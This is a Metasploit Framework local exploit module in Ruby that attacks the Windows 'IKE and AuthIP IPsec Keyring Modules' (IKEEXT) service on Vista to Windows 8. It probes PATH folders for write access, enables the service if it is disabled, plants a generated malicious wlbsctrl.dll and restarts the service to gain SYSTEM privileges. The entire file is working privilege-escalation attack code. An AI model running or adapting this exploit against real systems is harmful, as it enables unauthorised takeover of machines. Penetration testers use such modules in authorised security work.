##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'           => 'IKE and AuthIP IPsec Keyring Modules Missing DLL',
			'Description'    => %q{
				This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring
				Modules' service which runs as SYSTEM, and starts automatically in default
				installations of Vista-Win8.
			},
			'References'     =>
				[
					['URL', 'https://www.htbridge.com/advisory/HTB23108'],
					['URL', 'https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html']
				],
			'DisclosureDate' => "Oct 9 2012",
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Ben Campbell <eat_meatballs@hotmail.co.uk>',
				],
			'Platform'       => [ 'win'],
			'Targets'        => [ ['Windows', {}] ],
			'SessionTypes'   => [ "meterpreter" ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'WfsDelay' => '5'
				},
			'DefaultTarget'  => 0,
		))

		register_options([
			OptString.new("DIR", [ false, "Specify a directory to plant the DLL.", ""])
		])

		@load_lib_search_path = [	'%SystemRoot%\\System32',
									'%SystemRoot%\\System',
									'%SystemRoot%'
								]
		@non_existant_dirs = []
		@service_name = 'IKEEXT'
	end

	def check_service_exists?(service)
		service_info = service_info(service)

		if service_info.nil?
			print_error("Unable to enumerate services.")
			return false
		end

		if service_info && service_info['Name'].empty?
			print_error("Service #{service} does not exist.")
			return false
		else
			return true
		end
	end

	def check
		service_info = service_info('IKEEXT')

		if !check_service_exists?(@service_name)
			return Exploit::CheckCode::Safe
		else
			if service_info['Startup'] == 'Disabled'
				print_error("Service is Disabled, so will be unable to exploit unless account has correct permissions...")
				return Exploit::CheckCode::Safe
			end

			if check_search_path
				return Exploit::CheckCode::Safe
			end

			return Exploit::CheckCode::Vulnerable
		end
	end

	def check_search_path
		dll = 'wlbsctrl.dll'

		@load_lib_search_path.each do |path|
			dll_path = "#{expand_path(path)}\\#{dll}"

			# This seems to return false even when file exists?
			if file_exist?(dll_path)
				print_error("DLL already exists at #{dll_path}...")
				return true
			end
		end

		return false
	end

	def check_system_path
		print_status("Checking SYSTEM PATH folders for write access...")
		result  = registry_getvaldata('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment', 'Path')

		if result.nil?
			print_error("Unable to retrieve SYSTEM PATH from registry.")
			return
		end

		paths = result.split(';')
		paths.append(@load_lib_search_path).flatten!.uniq!

		paths.each do |p|
			path = expand_path(p)
			if exist?(path)
				filename = "#{path}\\#{Rex::Text.rand_text_alpha(10)}"
				vprint_status("Creating file #{filename}")
				begin
					if write_file(filename, "") and file_exist?(filename) # This will not work against UAC
						print_good("Write permissions in #{path}")
						begin
								file_rm(filename)
								vprint_status("Deleted file #{filename}")
								return path
						rescue ::Exception => e
							print_error("Error deleting #{filename} : #{e}") # Warn users if cleanup fails
						end
					end
				rescue ::Exception => e
					vprint_status("Unable to create #{filename} : #{e}")
				end
			else
				# User may be able to create the path...
				# exist? appears to have some false positives
				print_status("Path #{path} does not exist...")
				@non_existant_dirs << path
			end
		end

		return nil
	end

	# Todo, for all @non_existant_dirs can we create those
	# paths ourselves?
	def check_dirs
		print_status("Attempting to create a non-existant PATH dir to use.")
		@non_existant_dirs.each do |dir|
			begin
				client.fs.dir.mkdir(dir)
				return dir
			rescue  Rex::Post::Meterpreter::RequestError => e
				vprint_status("Unable to create dir: #{dir} - #{e}")
			end
		end

		return nil
	end

	# TODO Move to Exploit::Local?
	def session_arch
		if sysinfo["Architecture"] =~ /x64/i
			return ARCH_X64
		elsif sysinfo["Architecture"] =~ /x86/i
			return ARCH_X86
		else
			print_status("#{sysinfo["Architecture"]}")
			return nil
		end
	end

	def cleanup
		unless @reboot
			if @write_success && @dll_file_path
				begin
					file_rm(@dll_file_path)
					vprint_status("Deleted file #{@dll_file_path}")
				rescue ::Exception => e
					print_error("Error deleting #{@dll_file_path} : #{e}") # Warn users if cleanup fails
				end
			end
		end

		super
	end

	def exploit
		@reboot = false

		if is_system?
			print_error("Current user is already SYSTEM, aborting.")
			return
		end

		print_status("Checking service exists...")
		if !check_service_exists?(@service_name)
			return
		end

		if session_arch == 'ARCH_X64'
			print_error("Exploit currently does not work with x64.")
			return
		end

		if is_uac_enabled? && datastore['DIR'].empty?
			print_error("Unable to enumerate permissions with UAC enabled, manually set a directory to use.")
			print_status(registry_getvaldata('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment', 'Path'))
			return
		end

		if datastore['DIR'].empty?
			# DLL already exists in system folders, we dont want to overwrite by accident
			if check_search_path
				return
			end

			file_path = check_system_path
			file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs

			if file_path.nil?
				print_error("Unable to write to any folders in the PATH, aborting...")
				return
			end
		else
			# Use manually selected Dir
			file_path = datastore['DIR']
		end

		@dll_file_path = "#{file_path}\\wlbsctrl.dll"

		service_information = service_info(@service_name)

		if service_information['Startup'] == 'Disabled'
			print_status("Service is disabled, attempting to enable...")
			service_change_startup(@service_name, 'auto')
			service_information = service_info(@service_name)

			# Still disabled
			if service_information['Startup'] == 'Disabled'
				print_error("Unable to enable service, aborting...")
				return
			end
		end

		# Check architecture
		dll = generate_payload_dll({:arch => session_arch})

		#
		# Drop the malicious executable into the path
		#
		print_status("Writing #{dll.length.to_s} bytes to #{@dll_file_path}...")
		begin
			write_file(@dll_file_path, dll)
			@write_success = true
		rescue Rex::Post::Meterpreter::RequestError => e
			# Can't write the file, can't go on
			print_error(e.message)
			@write_success = false
			return
		end

		#
		# Run the service, let the Windows API do the rest
		#
		print_status("Launching service #{@service_name}...")

		begin
			status = service_start(@service_name)
			if status == 1
				print_status("Service already running, attempting to restart...")
				if service_stop(@service_name) == 0
					print_status("Service stopped, attempting to start...")
					if service_start(@service_name) == 0
						print_status("Service started...")
					else
						print_error("Unable to start service.")
					end
				else
					print_error("Unable to stop service.")
				end
			elsif status == 0
				print_status("Service started...")
			end
		rescue ::Exception => e
			if service_information['Startup'] == 'Manual'
				print_error("Unable to start service, and it does not auto start, cleaning up...")
			else
				@reboot = true
				print_status("Unable to start service, manually create handler and wait for a reboot...")
			end
		end
	end

end
